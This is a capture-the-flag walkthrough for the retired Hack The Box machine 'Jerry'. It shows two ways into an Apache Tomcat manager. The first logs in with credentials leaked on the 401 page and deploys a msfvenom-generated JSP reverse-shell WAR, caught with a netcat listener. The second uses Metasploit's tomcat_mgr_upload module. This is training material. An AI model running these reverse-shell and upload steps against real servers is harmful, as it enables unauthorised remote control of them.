<h1>Jerry</h1>

<h2>CONNECT</h2>
Connect to Starting Point VPN before starting the machine<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Fawn/Fawn/download.png" alt="download" width="30%">
Using <code>openvpn</code> to operate the file of <code>download vpn</code> in kali.

<h2>SUBMIT FLAG</h2>
<h3>Method 1 - Reverse Shell</h3>
Only <code>8080</code> port is opened on the machine and <code>Apache Tomcat</code> is running on it.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/nmap.png" alt="nmap" width="60%">
Without credentials, we are restricted from entering certain pages by clicking buttons.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/8080.png" alt="8080" width="60%">
The page will display the info of <code>401 Unauthorized</code>.<br>
If you watch carefully, the message include the <code>username</code> and the <code>userpassword</code> which we need.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/userpasswd.png" alt="download" width="60%">
Therefore, we use the given username and userpassword to login.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/login.png" alt="login" width="30%">
After login succcessfully, the url appended the postfix <code>/manager/html</code>.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/manager.png" alt="manager" width="60%">
Since now we are free to deploy <code>war files</code>, let’s generate a war file using <code>msfvenom</code> and save it as shell.war.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/WAR.png" alt="WAR" width="60%">
FYI：How to use <a href="https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html">Msfvenom</a><br>
<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Local IP&gt; LPORT=&lt;Local PORT&gt; -f war > /shell.war</code>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/msfvenom.png" alt="msfvenom" width="60%">
Once the shell.war is generated, upload it to Tomcat.<br>
Click <code>Deploy</code> after seeing the previously generated war file is selected that shown as below. <br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/uploadshell.war.png" alt="uploadshell.war" width="60%">
Before clicking on <code>shell</code> which we upload, run an nc shell to listen on a 1234 port.<br>
<code>nc -lvnp 1234</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/nc.png" alt="nc" width="30%">
Click on <code>shell</code> and a shell will be presented in the Netcat shell.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/afterupload.png" alt="afterupload" width="60%">
Travel through the directory and grab the flags.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/nc1.png" alt="nc1" width="60%">
Finally, you can get two flags！<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/flag.png" alt="flag" width="60%"><br>

<h2>SUBMIT FLAG</h2>
<h3>Method 2 - Metasploit</h3>
FYI：What is the <a href="https://www.offensive-security.com/metasploit-unleashed/msfconsole/">MSFconsole</a>?<br><br>
The interface of command <code>msfconsole</code> is shown below.<br>
Type <code>?</code> or <code>help</code>  can see the command descriptions.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/msfconsole.png" alt="msfconsole" width="80%">
Using <code>search</code> to find the specific module.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/searchtomcat.png" alt="searchtomcat" width="80%">
<code><b>use</b> exploit/multi/http/tomcat_mgr_upload</code>：Use a module <code>exploit/multi/http/tomcat_mgr_upload</code><br>
<code>show options</code>：Show module options<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/usesploit.png" alt="usesploit" width="80%">
Set parameter as below.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/usesploit1.png" alt="usesploit1" width="80%">
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/usesploit2.png" alt="usesploit2" width="80%">
Using <code>shell</code> to enter command mode.<br>
Using <code>whoami</code> to check the role.<br>
Travel through the directory and grab the flags.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/shell.png" alt="shell" width="60%">
Finally, you can get two flags！<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/flag.png" alt="flag" width="60%">
